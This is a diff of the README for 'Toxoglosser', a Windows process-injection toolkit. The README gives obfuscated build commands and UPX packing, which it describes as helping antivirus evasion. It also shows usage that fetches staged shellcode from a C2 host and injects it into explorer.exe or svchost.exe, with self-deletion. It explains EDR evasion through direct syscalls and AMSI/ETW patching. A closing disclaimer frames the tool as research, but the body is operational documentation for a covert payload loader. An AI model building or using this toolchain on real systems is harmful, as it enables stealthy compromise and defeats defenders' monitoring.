@@ -1,8 +1,6 @@
-# Toxoglosser: Process Injection Toolkit
+# Toxoglosser: Advanced Process Injection Toolkit
 
-`toxoglosser` is an operationally viable process injection tool for 64-bit Windows systems
-
-It incorporates cutting-edge EDR evasion techniques to inject staged payloads into target processes while evading modern security solutions like:
+`toxoglosser` is an operationally viable process injection tool for 64-bit Windows systems. It incorporates cutting-edge EDR evasion techniques to inject staged payloads into target processes while evading modern security solutions like:
 
 	+ Data Execution Prevention (DEP)
 	+ Address Space Layout Randomization (ASLR)
@@ -45,55 +43,81 @@ The tool is organized into several modules:
 - `payloads/` - Payload handling and encryption
 - `cmd/` - Command-line interface and main entry point
 
----
-
 ## Building
 
 ### Prerequisites
-- Go (v1.18 or later)
-- MinGW-w64 cross-compiler for Windows
-- Shellcode file named `shell.bin` in the project root
 
-### Build Commands
-
-To build the enhanced executable:
-```bash
-CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 go build -o toxoglosser_enhanced.exe ./cmd/toxoglosser.go
-```
-# Building Toxoglosser
-
-## Prerequisites
-
-- Go 1.22 or later
-- Garble v0.12+ (for code obfuscation)
+- Go 1.20 or later - Required for proper cross-compilation and build constraints
+- Garble v0.9.3+ (for code obfuscation)
 - UPX (optional, for size reduction and anti-virus evasion)
 - MinGW-w64 cross-compiler for Windows (if building from Linux)
 
-## Installation of Tools
+### Installation of Tools
 
-### Install Garble
+#### Install Garble
 ```bash
-go install mvdan.cc/garble@latest
+go install mvdan.cc/garble@v0.9.3
 ```
 
-### Install UPX (Optional)
+#### Install UPX (Optional)
 - Download from: https://upx.github.io/
 - Or install via package manager: `sudo apt install upx-ucl` (on Debian/Ubuntu)
 
-### Install MinGW-w64 (For Linux users)
+#### Install MinGW-w64 (For Linux users)
 - On Ubuntu/Debian: `sudo apt install gcc-mingw-w64-x86-64`
 - On CentOS/RHEL: `sudo yum install mingw64-gcc`
 - On Arch: `sudo pacman -S mingw-w64-gcc`
 
-## Build Commands
+### Build Commands
 
-### Standard Build (Recommended)
+#### Standard Build (Recommended)
 ```bash
 # Make build script executable
 chmod +x build.sh
 
 # Run the build script
 ./build.sh
+```
+
+#### Using Make
+```bash
+make build                # Build with Garble obfuscation (recommended)
+make build-plain          # Build without obfuscation
+make build-compressed     # Build and compress with UPX
+make cross-build          # Cross-compile for Windows from Linux
+make install-garble       # Install Garble obfuscator
+```
+
+#### Manual Build Commands
+
+##### Basic Build
+```bash
+go build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
+```
+
+##### With Garble Obfuscation
+```bash
+garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
+```
+
+##### With UPX Compression
+```bash
+# First build with Garble
+garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
+# Then compress with UPX
+upx --best --lzma toxoglosser.exe
+```
+
+##### Cross-compilation from Linux to Windows
+```bash
+# Set environment variables
+export CGO_ENABLED=1
+export CC=x86_64-w64-mingw32-gcc
+export GOOS=windows
+export GOARCH=amd64
+
+# Build command
+garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
 ```
 
 ### Common Build Issues and Solutions
@@ -118,46 +142,17 @@ chmod +x build.sh
 - **Issue**: `imported and not used` errors
 - **Solution**: Removed unused imports and restructured packages to avoid cycles
 
+#### 6. Go version compatibility
+- **Issue**: "Go version 'go1.18.1' is too old; please upgrade to Go 1.20.x or newer"
+- **Solution**: Update to Go 1.20+ and reinstall Garble with the newer Go version
+
 ### Troubleshooting Tips
 
-- Make sure you have the correct Go version (1.18 or later)
+- Make sure you have the correct Go version (1.20 or later)
 - Install MinGW-w64 cross-compiler for Windows target
 - Set the appropriate environment variables: `CGO_ENABLED=1`, `GOOS=windows`, `GOARCH=amd64`
 - Use the correct compiler flag: `CC=x86_64-w64-mingw32-gcc`
 - Ensure all dependencies are properly installed: `go mod download`
-```
-
-### Manual Build Commands
-
-#### Basic Build
-```bash
-go build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
-```
-
-#### With Garble Obfuscation
-```bash
-garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
-```
-
-#### With UPX Compression
-```bash
-# First build with Garble
-garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
-# Then compress with UPX
-upx --best --lzma toxoglosser.exe
-```
-
-### Cross-compilation from Linux to Windows
-```bash
-# Set environment variables
-export CGO_ENABLED=1
-export CC=x86_64-w64-mingw32-gcc
-export GOOS=windows
-export GOARCH=amd64
-
-# Build command
-garble -tiny -literals -seed=random build -ldflags="-s -w" -buildmode=pie -trimpath -o toxoglosser.exe toxoglosser.go
-```
 
 ## Build Optimizations Applied
 
@@ -198,110 +193,42 @@ After all optimizations, the binary should be significantly smaller than the ori
 
 - Without UPX: ~1.5-2 MB (depending on Go version)
 - With UPX: ~500-800 KB (much better for OPSEC)
-___
 
 ## Usage
 
 ```
-.\toxoglosser_enhanced.exe [OPTIONS]
+.\toxoglosser.exe [OPTIONS]
 ```
 
-### Options
+### Command-Line Options
 
-- `-file <path>`: Path to the shellcode file to execute
-- `-url <url>`: URL to fetch the shellcode from
-- `-pname <name>`: Name of the target process
-- `-pid <pid>`: PID of the target process  
-- `-technique <apc|hollow|doppel>`: Injection technique to use
-- `-delay <seconds>`: Delay with jitter before execution
-- `-v`: Enable verbose output
-
-### Examples
-
-- Default behavior with embedded payload: `.\toxoglosser_enhanced.exe`
-- Load shellcode from file: `.\toxoglosser_enhanced.exe -file payload.bin -pname explorer.exe`
-- Download from URL with APC injection: `.\toxoglosser_enhanced.exe -url http://example.com/payload.bin -technique apc -pid 1234`
-- Process hollowing with delay: `.\toxoglosser_enhanced.exe -file payload.bin -technique hollow -delay 10 -v`
-
-## Evasion Techniques Explained
-
-### Direct Syscalls
-Instead of using user-mode API functions that are commonly hooked by EDR solutions, Toxoglosser Enhanced calls Windows NT system calls directly, bypassing user-mode hooks
-
-### Early Bird APC Injection
-This technique creates a suspended process, injects the payload, and queues an Asynchronous Procedure Call (APC) to execute the payload in the context of the suspended process thread before it starts running normally
-
-### AMSI/ETW Patching
-Before executing the payload, the tool patches critical Windows functions to prevent in-memory scanning and event logging that would detect the malicious activity
-
-### RX Memory Allocation
-The tool allocates memory with RW (Read/Write) permissions, writes the payload, then changes permissions to RX (Read/Execute), avoiding the suspicious RWX (Read/Write/Execute) permissions that trigger security alerts
-
-## Security Considerations
-
-This is a security research tool designed for studying modern process injection and evasion techniques. All functionality is focused on Windows security bypasses and should only be used in controlled environments for legitimate security research purposes
-
-
-
-# Toxoglosser Usage Guide
-
-## Command-Line Options
-
-### Required Arguments (One of these)
+#### Required Arguments (One of these)
 - `-url <url>`: **REQUIRED** - URL to fetch the staged payload from (primary method)
 - `-file <path>`: Path to the shellcode file to execute (fallback method)
 
-### Process Targeting
+#### Process Targeting
 - `-pname <name>`: Name of the target process (e.g., `explorer.exe`, `svchost.exe`)
 - `-pid <pid>`: PID of the target process
 - If neither is specified, the tool will automatically hunt for suitable processes
 
-### Encryption & Payload Options
+#### Encryption & Payload Options
 - `-key <key>`: Key to decrypt staged payload if encrypted
 
-### Injection Options
+#### Injection Options
 - `-technique <apc|hollow|doppel>`: Injection technique to use
 - `-delay <seconds>`: Delay with jitter before execution
 
-### Additional Options
+#### Additional Options
 - `-v`: Enable verbose output
 - `-ah`: Use alternative process hunting technique
 - `-selfdelete`: Delete the executable after execution
 
-## Usage Examples
+### Examples
 
-### Primary Usage (Staged Payload - Recommended for OPSEC)
-```powershell
-# Download payload from C2 server and inject into explorer.exe
-.\toxoglosser.exe -url http://c2-server.com/payload.bin -pname explorer.exe -key "mySecretKey"
-```
-
-```powershell
-# Download payload from C2 server and inject into specific PID
-.\toxoglosser.exe -url http://c2-server.com/payload.bin -pid 1234
-```
-
-### Fallback Usage (Local File)
-```powershell
-# Load payload from local file (if C2 is unavailable)
-.\toxoglosser.exe -file C:\path\to\payload.bin -pname svchost.exe
-```
-
-### Advanced Usage
-```powershell
-# APC injection with staged payload
-.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique apc -pname services.exe -v
-```
-
-```powershell
-# Process hollowing with staged payload and process hunting
-.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique hollow -ah
-```
-
-```powershell
-# Staged payload with self-deletion
-.\toxoglosser.exe -url http://c2-server.com/payload.bin -selfdelete -v
-```
+- Default behavior with staged payload: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -pname explorer.exe`
+- Load shellcode from file: `.\toxoglosser.exe -file payload.bin -pname explorer.exe`
+- Download from URL with APC injection: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique apc -pid 1234`
+- Process hollowing with delay: `.\toxoglosser.exe -url http://c2-server.com/payload.bin -technique hollow -delay 10 -v`
 
 ## Payload Loading Methods
 
@@ -364,3 +291,7 @@ If no specific target is provided, the tool will hunt for suitable processes in 
 5. `winlogon.exe` - Windows login manager
 6. `dwm.exe` - Desktop window manager
 7. `csrss.exe` - Client/Server Runtime Subsystem
+
+## Security Considerations
+
+This is a security research tool designed for studying modern process injection and evasion techniques. All functionality is focused on Windows security bypasses and should only be used in controlled environments for legitimate security research purposes
